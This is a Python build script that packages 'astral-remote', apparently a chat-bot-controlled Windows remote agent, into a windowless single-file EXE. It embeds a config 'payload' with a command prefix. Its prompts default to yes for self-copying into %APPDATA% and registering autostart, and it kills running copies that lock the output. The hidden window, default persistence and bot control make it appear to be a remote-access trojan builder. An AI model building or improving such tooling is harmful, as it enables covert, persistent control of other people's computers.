# EXE build pipeline for dist/astral-remote.exe.
# Flow: validate non-secret default config before work, create isolated
# staging package copy under build-tmp/, generate _embedded_payload.py
# only inside that staged copy, run PyInstaller --onefile --noconsole,
# verify size/PE subsystem/smoke, then atomically publish into dist/.
# A complete per-token rebuild is expected; no overlay appending is used.
# Failures keep the previous valid output. Cleanup is attempted on all
# paths, but Windows journaling/SSD wear/AV quarantine prevent any
# forensic-erasure guarantee. Build logs are redacted.
# Ported from src/builder/build-agent.js pipeline semantics.

from __future__ import annotations

import atexit
import datetime
import importlib.util
import os
import random
import shutil
import signal
import string
import subprocess
import sys
import time
from pathlib import Path

from astral_remote.agent.secure_input import InterruptedError
from astral_remote.builder.payload_codegen import render_payload_module
from astral_remote.builder.subsystem import set_gui_subsystem
from astral_remote.builder.verification import check_gui_subsystem, check_size, self_test, smoke_test
from astral_remote.shared.config import (
    DEFAULT_BOT_PREFIX,
    DEFAULT_STARTUP_NAME,
    MAX_BOT_PREFIX_LENGTH,
    default_runtime_config,
    is_valid_prefix,
)
from astral_remote.shared.errors import BuildError
from astral_remote.shared.logging_utils import error, info, redact

ROOT = Path(__file__).resolve().parent.parent.parent
DIST_DIR = ROOT / "dist"
OUTPUT_EXE = DIST_DIR / "astral-remote.exe"
BUILD_TMP = ROOT / "build-tmp"
SRC_PACKAGE = ROOT / "astral_remote"

_TRACKED_STAGING: list[Path] = []


def _track(path: Path) -> Path:
    _TRACKED_STAGING.append(path)
    return path


def _cleanup_tracked() -> None:
    while _TRACKED_STAGING:
        path = _TRACKED_STAGING.pop()
        shutil.rmtree(path, ignore_errors=True)


atexit.register(_cleanup_tracked)


DEFAULT_EXE_NAME = "astral-remote.exe"


def sanitize_exe_name(raw=None, default: str = DEFAULT_EXE_NAME) -> str:
    """Validate a user-supplied EXE file name. Returns the file name only.

    Empty input selects the default. Appends .exe when missing. Rejects
    directories, traversal, drive letters, and Windows-invalid
    characters. Never returns a path.
    """
    name = (raw or "").strip()
    if name == "":
        return default
    if ".." in name or "/" in name or "\\" in name or ":" in name:
        raise BuildError("Output name must be a plain file name, not a path.")
    if any(ch in name for ch in '<>|?*"') or any(ord(ch) < 32 for ch in name):
        raise BuildError('Output name contains invalid characters (<>|?*" or control codes).')
    if len(name) > 100:
        raise BuildError("Output name too long (max 100 characters).")
    if not name.lower().endswith(".exe"):
        name += ".exe"
    return name


def sanitize_prefix(raw=None, default: str = DEFAULT_BOT_PREFIX) -> str:
    """Validate a build-time bot prefix. Empty input selects the default.

    A prefix is one to eight printable characters without whitespace, so
    the command word can always be split from its arguments. Raises
    BuildError for an unusable explicit value instead of changing it.
    """
    if raw is None:
        return default
    text = str(raw).strip()
    if text == "":
        return default
    if not is_valid_prefix(text):
        raise BuildError(f"Prefix must be 1-{MAX_BOT_PREFIX_LENGTH} characters without whitespace.")
    return text


def prompt_prefix(default: str = DEFAULT_BOT_PREFIX) -> str:
    """Ask for the bot command prefix. Bare Enter selects the default.

    Themed through the same path as the token, name, and yes/no prompts;
    non-TTY streams (pipes, tests) get plain text. An unusable answer
    falls back to the default instead of failing the build.
    """
    from astral_remote.agent.secure_input import _styled_line
    from astral_remote.cli.theme import supports_color

    label = f"[Bot command prefix] (default: {default}): "
    try:
        sys.stdout.write(_styled_line(label, supports_color()))
        sys.stdout.flush()
    except (OSError, ValueError, AttributeError):
        pass
    try:
        readline = getattr(sys.stdin, "readline", None)
        raw = readline() if callable(readline) else ""
    except KeyboardInterrupt as exc:
        raise InterruptedError("INTERRUPTED") from exc
    except (EOFError, OSError, ValueError):
        return default
    try:
        return sanitize_prefix(raw, default)
    except BuildError as err:
        print(f"Invalid prefix ({err}); using default {default}.")
        return default


def prompt_exe_name(default: str = DEFAULT_EXE_NAME) -> str:
    """Ask for the output EXE name. Bare Enter selects the default.

    Themed with the shared purple palette via the same styling path as
    the token prompt. Non-TTY streams (pipes, tests) get plain text, so
    captured output and assertions stay uncolored.
    """
    from astral_remote.agent.secure_input import _styled_line
    from astral_remote.cli.theme import supports_color

    label = f"[Output EXE name] (default: {default}): "
    try:
        sys.stdout.write(_styled_line(label, supports_color()))
        sys.stdout.flush()
    except (OSError, ValueError, AttributeError):
        pass
    try:
        readline = getattr(sys.stdin, "readline", None)
        raw = readline() if callable(readline) else ""
    except KeyboardInterrupt as exc:
        raise InterruptedError("INTERRUPTED") from exc
    except (EOFError, OSError, ValueError):
        return default
    try:
        return sanitize_exe_name(raw, default)
    except BuildError as err:
        print(f"Invalid name ({err}); using default {default}.")
        return default


def prompt_bool(label: str, default: bool = True) -> bool:
    """Ask a yes/no build option. Bare Enter or unrecognized input keeps `default`.

    Styled through the same path as the token and name prompts; non-TTY
    streams (pipes, tests) get plain text, so captured output stays
    uncolored.
    """
    from astral_remote.agent.secure_input import _styled_line
    from astral_remote.cli.theme import supports_color

    hint = "Y/n" if default else "y/N"
    try:
        sys.stdout.write(_styled_line(f"[{label}] ({hint}): ", supports_color()))
        sys.stdout.flush()
    except (OSError, ValueError, AttributeError):
        pass
    try:
        readline = getattr(sys.stdin, "readline", None)
        raw = (readline() if callable(readline) else "").strip().lower()
    except KeyboardInterrupt as exc:
        raise InterruptedError("INTERRUPTED") from exc
    except (EOFError, OSError, ValueError):
        return default
    if raw in ("y", "yes"):
        return True
    if raw in ("n", "no"):
        return False
    return default


def prompt_install_appdata() -> bool:
    """Ask whether the built EXE should copy itself under %APPDATA%."""
    return prompt_bool("Copy Agent into %APPDATA%", default=True)


def prompt_autostart() -> bool:
    """Ask whether the built EXE should register Windows autostart."""
    return prompt_bool("Register Windows autostart", default=True)


def _ensure_pyinstaller() -> None:
    """Fail fast when the interpreter running the build lacks PyInstaller.

    The packager runs as `sys.executable -m PyInstaller`, so a build
    started from a Python without PyInstaller would otherwise fail inside
    the child process with an opaque exit code. Checking here turns that
    into an actionable message before any token prompt or staging work.
    """
    if importlib.util.find_spec("PyInstaller") is None:
        raise BuildError(
            f"PyInstaller is not installed for {sys.executable}. "
            "Install the build dependencies first: python -m pip install -r requirements.txt"
        )


def _stage_package() -> Path:
    """Copy the required package files into an isolated staging tree."""
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    stage = _track(BUILD_TMP / f"remote-build-{os.getpid()}-{suffix}")
    dest = stage / "pkg" / "astral_remote"
    ignore = shutil.ignore_patterns("__pycache__", "*.pyc", "tests", "_embedded_payload.py")
    shutil.copytree(SRC_PACKAGE, dest, ignore=ignore)
    (stage / "pkg" / "run_agent.py").write_text(
        "from astral_remote.agent.app import entry\n\nif __name__ == '__main__':\n    entry()\n",
        encoding="utf-8",
    )
    return stage


_current_child = None


def _on_signal(signum, frame) -> None:  # noqa: ANN001, ANN202
    """Abort an in-progress build on Ctrl+C / termination.

    Cleans staging, kills the packager child so no orphan keeps
    running, then raises KeyboardInterrupt so blocking waits unwind.
    Only the build stops; the menu loop catches it and redraws.
    """
    _cleanup_tracked()
    child = _current_child
    if child is not None:
        try:
            child.kill()
        except OSError:
            pass
    raise KeyboardInterrupt()


def _run_pyinstaller(stage: Path, log_lines: list) -> Path:
    """Run PyInstaller into the staging dist dir. Returns the produced EXE path."""
    out_dir = stage / "dist"
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--name", "AstralRemote-Agent",
        "--distpath", str(out_dir),
        "--workpath", str(stage / "work"),
        "--specpath", str(stage),
        "--paths", str(stage / "pkg"),
        str(stage / "pkg" / "run_agent.py"),
    ]
    global _current_child
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, encoding="utf-8", errors="replace",
                                shell=False, cwd=str(ROOT))
    except OSError as exc:
        raise BuildError(f"Packager failed to start: {exc}") from exc
    try:
        _current_child = proc
        out, err = proc.communicate(timeout=3600)
    except subprocess.TimeoutExpired as exc:
        try:
            proc.kill()
        except OSError:
            pass
        raise BuildError(f"Packager timed out: {exc}") from exc
    except (OSError, subprocess.SubprocessError) as exc:
        raise BuildError(f"Packager failed: {exc}") from exc
    finally:
        _current_child = None
    log_lines.append(str(redact(out or "")))
    log_lines.append(str(redact(err or "")))
    if proc.returncode != 0:
        raise BuildError(f"Packager exited with code {proc.returncode}. See dist build log.")
    produced = out_dir / "AstralRemote-Agent.exe"
    if not produced.is_file():
        raise BuildError("Packager finished without producing the expected EXE.")
    return produced


def _stage_log_path() -> Path:
    stamp = datetime.datetime.now(datetime.timezone.utc).isoformat().replace(":", "-")
    return DIST_DIR / f"build-py-{stamp}.log"


def build_agent(on_stage=None, output_name: str | None = None,
                install_to_appdata: bool = True, enable_autostart: bool = True,
                prefix: str = DEFAULT_BOT_PREFIX) -> dict:
    """Generate EXE with default non-secret runtime configuration.

    `install_to_appdata` and `enable_autostart` are embedded as the EXE's
    build-time self-install choices. The output name (without extension)
    becomes the `%APPDATA%` subfolder and autostart entry name. `prefix`
    is embedded as the bot command prefix for the managed #main channel.
    """
    _ensure_pyinstaller()
    exe_name = sanitize_exe_name(output_name or DEFAULT_EXE_NAME)
    startup_name = Path(exe_name).stem or DEFAULT_STARTUP_NAME
    bot_prefix = sanitize_prefix(prefix)
    staged_config = default_runtime_config(install_to_appdata, enable_autostart,
                                           startup_name, bot_prefix)
    output_exe = DIST_DIR / exe_name
    DIST_DIR.mkdir(parents=True, exist_ok=True)
    BUILD_TMP.mkdir(parents=True, exist_ok=True)
    log_lines: list[str] = []

    def log(text: str) -> None:
        log_lines.append(str(redact(str(text))))
        if on_stage is not None:
            try:
                on_stage(str(text))
            except Exception:
                pass

    log_path = _stage_log_path()

    old_handlers = {}
    for signame in ("SIGINT", "SIGTERM"):
        try:
            old_handlers[signame] = signal.getsignal(getattr(signal, signame))
            signal.signal(getattr(signal, signame), _on_signal)
        except (OSError, ValueError, AttributeError):
            pass
    try:
        log(f"Generating AstralRemote-Agent v{staged_config['agentVersion']} for win-x64 PyInstaller onefile.")
        log(f"Command prefix: {bot_prefix}")
        stage = _stage_package()
        try:
            log("Preparing template")
            module_source = render_payload_module(staged_config)
            (stage / "pkg" / "astral_remote" / "_embedded_payload.py").write_text(module_source, encoding="utf-8")
            try:
                os.chmod(stage / "pkg" / "astral_remote" / "_embedded_payload.py", 0o600)
            except OSError:
                pass
            log("Packaging")
            temp_exe = DIST_DIR / f".agent-tmp-{os.getpid()}.exe"
            produced = _run_pyinstaller(stage, log_lines)
            log("Embedding payload")
            shutil.copy2(produced, temp_exe)
            check_size(str(temp_exe))
            try:
                set_gui_subsystem(str(temp_exe))
            except ValueError:
                pass
            check_gui_subsystem(str(temp_exe))
            version_line = smoke_test(str(temp_exe))
            log(f"Smoke test passed: {version_line}")
            report = self_test(str(temp_exe))
            if report["returncode"] != 0:
                raise BuildError(f"Self-test failed with exit code {report['returncode']}.")
            log("Verifying output")
            _publish_with_retry(temp_exe, output_exe, log)
            log(f"Payload embedded and verified: {version_line}")
            info(f"Build done: {output_exe}")
            return {"exe_path": str(output_exe), "version_line": version_line, "prefix": bot_prefix}
        finally:
            _cleanup_tracked()
    except InterruptedError:
        raise
    except BuildError:
        error("Build failed.")
        raise
    except Exception as exc:  # noqa: BLE001 - wrapped as user-safe BuildError
        error("Build failed.", {"message": str(exc)})
        raise BuildError(str(exc)) from exc
    finally:
        for signame, handler in old_handlers.items():
            try:
                signal.signal(getattr(signal, signame), handler)
            except (OSError, ValueError, AttributeError):
                pass
        try:
            log_path.write_text("\n".join(log_lines) + "\n", encoding="utf-8")
        except OSError:
            pass
        _cleanup_tracked()


def _publish_with_retry(temp_exe: Path, output_exe: Path, log) -> None:
    """Atomically publish the verified output, retrying Windows file locks.

    After a few failed attempts the running agent holding the file is
    terminated once (never this process), then retries continue.
    """
    from astral_remote.agent.startup import terminate_holders

    last: Exception | None = None
    for attempt in range(1, 31):
        try:
            if output_exe.exists():
                try:
                    output_exe.unlink()
                except OSError as exc:
                    raise exc
            os.replace(temp_exe, output_exe)
            try:
                temp_exe.unlink(missing_ok=True)
            except OSError:
                pass
            return
        except OSError as exc:
            last = exc
            if attempt == 3:
                try:
                    killed = terminate_holders(str(output_exe))
                    log(f"Stopped {killed} running agent(s) holding the output file.")
                except Exception:
                    pass
            else:
                log(f"Publishing locked (attempt {attempt}/30), retrying.")
            time.sleep(2)
    hint = ""
    if last is not None and "permission" in str(last).lower():
        hint = " If the Agent is still running, stop it first: a running EXE locks its own file."
    raise BuildError(f"Publishing failed after retries: {last}.{hint}")


def archive_stale_output(exe_path=None):
    """Rename stale output aside before a rebuild. Returns the backup path or None."""
    target = Path(exe_path) if exe_path is not None else OUTPUT_EXE
    try:
        target.stat()
    except OSError:
        return None
    backup = target.parent / f"{target.name}.stale-{int(time.time() * 1000)}"
    os.replace(target, backup)
    return str(backup)
